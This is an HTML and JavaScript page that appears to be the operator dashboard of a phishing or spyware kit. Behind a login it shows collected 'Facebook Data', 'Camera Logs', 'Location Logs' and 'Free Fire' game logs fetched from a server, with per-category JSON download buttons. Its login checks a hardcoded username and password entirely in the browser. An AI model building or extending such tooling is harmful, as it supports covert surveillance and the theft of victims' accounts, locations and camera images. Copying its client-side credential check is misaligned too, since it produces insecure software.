<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Admin Panel - Collected Data Viewer</title>
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            --pink-accent: #ff2a85;
            --purple-accent: #9d4edd;
            --text-color: #f8f9fa;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-gradient);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-attachment: fixed;
        }

        .glass-card {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            box-shadow: var(--glass-shadow);
        }

        /* Login Screen */
        #loginContainer {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            text-align: center;
        }

        h2 {
            margin-top: 0;
            color: #fff;
            font-size: 1.8rem;
            margin-bottom: 25px;
            text-shadow: 0 2px 10px rgba(255, 42, 133, 0.5);
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #e0aaff;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: white;
            font-size: 1rem;
            outline: none;
            box-sizing: border-box;
        }

        .btn {
            background: linear-gradient(135deg, var(--pink-accent), var(--purple-accent));
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
        }

        .error-msg {
            color: #ff6b6b;
            font-size: 0.85rem;
            margin-top: 15px;
        }

        /* Dashboard */
        #dashboardContainer {
            display: none;
            width: 100%;
            max-width: 1100px;
            padding: 30px;
            box-sizing: border-box;
        }

        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--glass-border);
            padding-bottom: 15px;
            margin-bottom: 20px;
        }

        .btn-logout {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid var(--glass-border);
            padding: 8px 15px;
            width: auto;
            font-size: 0.85rem;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            overflow-x: auto;
        }

        .tab-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--glass-border);
            padding: 10px 18px;
            font-size: 0.9rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            color: #d8b4fe;
            white-space: nowrap;
        }

        .tab-btn.active {
            background: linear-gradient(135deg, var(--pink-accent), var(--purple-accent));
            color: white;
            border-color: transparent;
            box-shadow: 0 0 15px rgba(255, 42, 133, 0.5);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .viewer-screen {
            width: 100%;
            height: 450px;
            border: 2px dashed var(--glass-border);
            border-radius: 10px;
            overflow: auto;
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            box-sizing: border-box;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            color: #fff;
            font-size: 0.9rem;
        }

        th, td {
            padding: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            text-align: left;
        }

        th {
            color: #ff758c;
            background: rgba(0, 0, 0, 0.3);
        }

        .action-bar {
            display: flex;
            justify-content: flex-end;
            margin-top: 15px;
        }

        .btn-download {
            background: linear-gradient(135deg, #10b981, #059669);
            width: auto;
            padding: 10px 20px;
            text-decoration: none;
            color: white;
            border-radius: 6px;
            font-weight: 600;
            font-size: 0.9rem;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- 1. LOGIN SCREEN -->
    <div id="loginContainer" class="glass-card">
        <h2>🔒 Admin Login</h2>
        <div class="input-group">
            <label>Username</label>
            <input type="text" id="usernameInput" placeholder="Enter username">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="passwordInput" placeholder="Enter password">
        </div>
        <button class="btn" onclick="handleLogin()">Login Dashboard</button>
        <div id="errorMsg" class="error-msg"></div>
    </div>

    <!-- 2. DASHBOARD -->
    <div id="dashboardContainer" class="glass-card">
        <div class="dashboard-header">
            <h2>✨ Live Collected Data Viewer</h2>
            <button class="btn btn-logout" onclick="handleLogout()">Logout</button>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" data-target="facebook" onclick="switchTab('facebook')">📘 Facebook Data</button>
            <button class="tab-btn" data-target="camera" onclick="switchTab('camera')">📷 Camera Logs</button>
            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Location Logs</button>
            <button class="tab-btn" data-target="ff" onclick="switchTab('ff')">🎮 Free Fire Logs</button>
        </div>

        <!-- Dynamic Data Section for Tabs -->
        <div id="facebook-section" class="tab-content active">
            <div class="viewer-screen" id="facebookViewer">Loading data...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('facebook')">📥 Download Facebook JSON</button>
            </div>
        </div>

        <div id="camera-section" class="tab-content">
            <div class="viewer-screen" id="cameraViewer">Loading data...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('camera')">📥 Download Camera JSON</button>
            </div>
        </div>

        <div id="location-section" class="tab-content">
            <div class="viewer-screen" id="locationViewer">Loading data...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('location')">📥 Download Location JSON</button>
            </div>
        </div>

        <div id="ff-section" class="tab-content">
            <div class="viewer-screen" id="ffViewer">Loading data...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('ff')">📥 Download FF JSON</button>
            </div>
        </div>
    </div>

    <script>
        const correctUser = "sumit@1123";
        const correctPass = "sumit1123";
        let globalData = {};

        window.onload = function() {
            if (sessionStorage.getItem("isAdminLoggedIn") === "true") {
                showDashboard();
            }
        };

        function handleLogin() {
            const user = document.getElementById("usernameInput").value.trim();
            const pass = document.getElementById("passwordInput").value.trim();
            if (user === correctUser && pass === correctPass) {
                sessionStorage.setItem("isAdminLoggedIn", "true");
                showDashboard();
            } else {
                document.getElementById("errorMsg").textContent = "Invalid Credentials!";
            }
        }

        function showDashboard() {
            document.getElementById("loginContainer").classList.add("hidden");
            document.getElementById("dashboardContainer").style.display = "block";
            fetchDataFromServer();
        }

        function handleLogout() {
            sessionStorage.removeItem("isAdminLoggedIn");
            location.reload();
        }

        function switchTab(category) {
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            document.querySelector(`[data-target="${category}"]`).classList.add('active');
            document.getElementById(`${category}-section`).classList.add('active');
        }

        // Server se data fetch karne ka function
        function fetchDataFromServer() {
            fetch('/get-data')
                .then(res => res.json())
                .then(data => {
                    globalData = data;
                    renderTable('facebook', 'facebookViewer');
                    renderTable('camera', 'cameraViewer');
                    renderTable('location', 'locationViewer');
                    renderTable('ff', 'ffViewer');
                })
                .catch(err => console.error("Error fetching data:", err));
        }

        function renderTable(category, containerId) {
            const container = document.getElementById(containerId);
            const items = globalData[category] || [];

            if (items.length === 0) {
                container.innerHTML = `<div style="text-align: center; color: #b8c1ec; padding: 20px;">No data recorded for ${category} yet.</div>`;
                return;
            }

            let html = `<table><thead><tr><th>Timestamp</th><th>Details</th></tr></thead><tbody>`;
            items.forEach(item => {
                let detailsStr = JSON.stringify(item.data, null, 2);
                html += `<tr><td>${item.timestamp}</td><td><pre style="margin:0; color:#ff758c;">${detailsStr}</pre></td></tr>`;
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }

        // Individual category data download button
        function downloadJSON(category) {
            const items = globalData[category] || [];
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(items, null, 2));
            const downloadAnchor = document.createElement('a');
            downloadAnchor.setAttribute("href", dataStr);
            downloadAnchor.setAttribute("download", `${category}_logs.json`);
            document.body.appendChild(downloadAnchor);
            downloadAnchor.click();
            downloadAnchor.remove();
        }
    </script>
</body>
</html>
